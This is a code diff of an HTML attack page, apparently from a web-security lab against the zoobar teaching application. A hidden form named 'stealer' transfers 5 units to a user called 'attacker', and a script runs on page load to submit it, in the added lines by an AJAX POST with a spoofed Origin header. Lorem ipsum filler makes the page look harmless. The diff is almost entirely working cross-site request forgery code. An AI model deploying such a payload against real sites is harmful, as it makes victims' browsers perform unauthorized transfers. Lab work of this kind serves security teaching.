@@ -9,6 +9,24 @@
     <input type="hidden" name="name" value="attacker">
     <input type="hidden" name="amount" value="5">
   </form>
+  <script type="text/javascript" charset="utf-8">
+  $(document).ready(function() {
+    var stealer = document.getElementById('stealer');
+    $.ajax({
+      data: {
+        name: stealer.name.value,
+        amount: stealer.amount.value,
+        crossDomain: true
+      },
+      headers: {
+        'Origin': 'http://zoobar.org:5000/'
+      },
+      type: 'POST',
+      url: stealer.action
+    }); // doesn't work on chrome :'(
+    // stealer.submit();
+  });
+  </script>
   <div>
     Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce at magna eget risus elementum rutrum. Praesent risus nisl, vestibulum non sodales eu, pretium ac arcu. Suspendisse vitae auctor nisl. Nullam quis ipsum massa. Morbi quis tellus vel orci consequat mattis eget sed nulla. In dictum consectetur risus a tincidunt. Donec at purus metus, vitae pharetra elit. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum in neque ac elit dapibus ultrices quis quis turpis. In faucibus enim tortor. Aliquam vitae urna non felis venenatis laoreet eget eget dui. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Etiam at metus lobortis elit lacinia pharetra in eget diam. Sed vitae posuere tellus. Integer tincidunt, justo in lacinia bibendum, ante nisi dictum dui, nec suscipit lorem mi sit amet dui.
 
@@ -20,21 +38,5 @@
 
     Sed commodo bibendum pulvinar. Fusce tristique consectetur dictum. Quisque ut ligula lectus. Phasellus quam ipsum, commodo id euismod nec, pulvinar quis nisl. Nam lectus velit, tempor nec feugiat vel, hendrerit at quam. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Ut porttitor justo sit amet lectus pulvinar aliquam. Vestibulum aliquet felis id elit iaculis ac eleifend nisi dictum. Nulla congue condimentum porttitor. Duis sapien mauris, gravida sit amet fermentum nec, adipiscing ac odio. Praesent id vestibulum nunc. Quisque vel enim est, at imperdiet nulla. Integer laoreet gravida facilisis. Suspendisse pretium lacinia libero et sagittis. Morbi ac dolor orci, pharetra ornare elit. Maecenas varius bibendum ornare.
   </div>
-  <script type="text/javascript" charset="utf-8">
-  $(document).ready(function() {
-    var stealer = document.getElementById('stealer');
-    console.log(stealer.amount.value);
-    // $.ajax({
-    //   data: {
-    //     name: stealer.name.value,
-    //     amount: stealer.amount.value,
-    //     crossDomain: true
-    //   },
-    //   type: 'POST',
-    //   url: stealer.action
-    // }); // doesn't work on chrome :'(
-    stealer.submit();
-  });
-  </script>
 </body>
 </html>
